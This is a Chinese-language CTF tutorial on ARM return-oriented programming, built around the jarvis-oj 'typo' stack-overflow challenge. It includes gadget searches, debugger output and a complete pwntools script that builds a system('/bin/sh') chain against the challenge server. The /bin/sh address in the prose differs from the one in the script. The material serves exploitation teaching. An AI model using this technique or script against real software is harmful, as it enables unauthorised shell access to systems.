# arm - ROP

## 介绍
因为目前为止，arm， mips 等架构出现的 pwn 还是较简单的栈漏洞，因此目前只打算介绍 arm 下的 rop，其他漏洞的利用以后会逐渐介绍

## 预备知识
先看一下 arm 下的函数调用约定，函数的第 1 ～ 4 个参数分别保存在 **r0 ～ r3** 寄存器中， 剩下的参数从右向左依次入栈， 被调用者实现栈平衡，函数的返回值保存在 **r0** 中

![](https://courses.washington.edu/cp105/_images/ARM_Calling_Convention.png)

除此之外，arm 的 **b/bl** 等指令实现跳转; **pc** 寄存器相当于 x86 的 eip，保存下一条指令的地址，也是我们要控制的目标

## 例题
这里以 jarvis-oj 的 typo 一题为例进行展示，题目可以在 [ctf-challenge](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/arm/jarvisOJ_typo) 下载

### 确定保护
```bash
jarvisOJ_typo [master●●] check ./typo
typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped
[*] '/home/m4x/pwn_repo/jarvisOJ_typo/typo'
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8000)
```
静态链接的程序，没有开栈溢出保护和 PIE; 静态链接说明我们可以在 binary 里找到 **system** 等危险函数和 **"/bin/sh"** 等敏感字符串，因为又是 No PIE， 所以我们只需要栈溢出就能构造 ropchain 来 get shell

### 利用思路
因此需要我们找一个溢出点，先运行一下程序，因为是静态链接的，所以在环境配置好的情况下直接运行即可
```bash
jarvisOJ_typo [master●●] ./typo 
Let's Do Some Typing Exercise~
Press Enter to get start;
Input ~ if you want to quit

------Begin------
throng
throng

survive
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
[1]    1172 segmentation fault  ./typo
```

程序的输入点不多，很容易就能找到溢出点

### 构造 ROP 
因此思路就很明显了，利用栈溢出构造 **system("/bin/sh")**， 先找一下 gadgets
```bash
jarvisOJ_typo [master●●] ROPgadget --binary ./typo --only "pop"   
Gadgets information
============================================================
0x00020904 : pop {r0, r4, pc}
0x00068bec : pop {r1, pc}
0x00008160 : pop {r3, pc}
0x0000ab0c : pop {r3, r4, r5, pc}
0x0000a958 : pop {r3, r4, r5, r6, r7, pc}
0x00014a70 : pop {r3, r4, r7, pc}
0x000083b0 : pop {r4, pc}
0x00009284 : pop {r4, r5, pc}
0x000095b8 : pop {r4, r5, r6, pc}
0x000082e8 : pop {r4, r5, r6, r7, pc}
0x00023ed4 : pop {r4, r5, r7, pc}
0x00023dbc : pop {r4, r7, pc}
0x00014068 : pop {r7, pc}

Unique gadgets found: 13
```

我们只需要控制第一个参数，因此可以选择 `pop {r0, r4, pc}` 这条 gadgets, 来构造如下的栈结构
```
+-------------+
|             |
|  padding    |
+-------------+
|  padding    | <- frame pointer
+-------------+ 
|gadgets_addr | <- return address
+-------------+
|binsh_addr   |
+-------------+
|junk_data    |
+-------------+
|system_addr  |
+-------------+
```

这时还需要 padding 的长度和 system 以及 /bin/sh 的地址， /bin/sh 的地址用 ROPgadget 就可以找到
```bash
jarvisOJ_typo [master●●] ROPgadget --binary ./typo --string /bin/sh
Strings information
============================================================
0x0006cb70 : /bin/sh
```
padding 的长度可以使用 pwntools 的 **cyclic** 来很方便的找到
```assembly
pwndbg> cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
pwndbg> c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x62616164 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────
 R0   0x0
 R1   0xfffef024 ◂— 0x61616161 ('aaaa')
 R2   0x7e
 R3   0x0
 R4   0x62616162 ('baab')
 R5   0x0
 R6   0x0
 R7   0x0
 R8   0x0
 R9   0xa5ec ◂— push   {r3, r4, r5, r6, r7, r8, sb, lr}
 R10  0xa68c ◂— push   {r3, r4, r5, lr}
 R11  0x62616163 ('caab')
 R12  0x0
 SP   0xfffef098 ◂— 0x62616165 ('eaab')
 PC   0x62616164 ('daab')
───────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────
Invalid address 0x62616164










────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
00:0000│ sp  0xfffef098 ◂— 0x62616165 ('eaab')
01:0004│     0xfffef09c ◂— 0x62616166 ('faab')
02:0008│     0xfffef0a0 ◂— 0x62616167 ('gaab')
03:000c│     0xfffef0a4 ◂— 0x62616168 ('haab')
04:0010│     0xfffef0a8 ◂— 0x62616169 ('iaab')
05:0014│     0xfffef0ac ◂— 0x6261616a ('jaab')
06:0018│     0xfffef0b0 ◂— 0x6261616b ('kaab')
07:001c│     0xfffef0b4 ◂— 0x6261616c ('laab')
Program received signal SIGSEGV
pwndbg> cyclic -l 0x62616164
112
```
因此 padding 长度即为 112
> 或者可以更暴力一点直接爆破栈溢出的长度

至于 system 的地址，因为这个 binary 被去除了符号表，我们可以先用 `rizzo` 来恢复部分符号表（关于恢复符号表暂时可以先看参考链接，以后会逐渐介绍）。虽然 rizzo 在这个 binary 上恢复的效果不好，但很幸运，在识别出来的几个函数中刚好有 system
```C
char *__fastcall system(int a1)
{
  char *result; // r0

  if ( a1 )
    result = sub_10BA8(a1);
  else
    result = (char *)(sub_10BA8((int)"exit 0") == 0);
  return result;
}
```
> 或者可以通过搜索 /bin/sh 字符串来寻找 system 函数
## exp
所有的条件都有了，构造 system("/bin/sh") 即可
```
jarvisOJ_typo [master●●] cat solve.py 
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import sys
import pdb
#  context.log_level = "debug"

#  for i in range(100, 150)[::-1]:
for i in range(112, 123):
    if sys.argv[1] == "l":
        io = process("./typo", timeout = 2)
    elif sys.argv[1] == "d":
        io = process(["qemu-arm", "-g", "1234", "./typo"])
    else:
        io = remote("pwn2.jarvisoj.com", 9888, timeout = 2)
    
    io.sendafter("quit\n", "\n")
    io.recvline()
    
    '''
    jarvisOJ_typo [master●●] ROPgadget --binary ./typo --string /bin/sh
    Strings information
    ============================================================
    0x0006c384 : /bin/sh
    jarvisOJ_typo [master●●] ROPgadget --binary ./typo --only "pop|ret" | grep r0
    0x00020904 : pop {r0, r4, pc}
    '''
    
    payload = 'a' * i + p32(0x20904) + p32(0x6c384) * 2 + p32(0x110B4)
    success(i)
    io.sendlineafter("\n", payload)

    #  pause()
    try:
        #  pdb.set_trace()
        io.sendline("echo aaaa")
        io.recvuntil("aaaa", timeout = 1)
    except EOFError:
        io.close()
        continue
    else:
        io.interactive()
```

## 例题
Codegate2015 - melong

## 参考文献
http://m4x.fun/post/arm_pwn/

http://www.freebuf.com/articles/terminal/134980.html
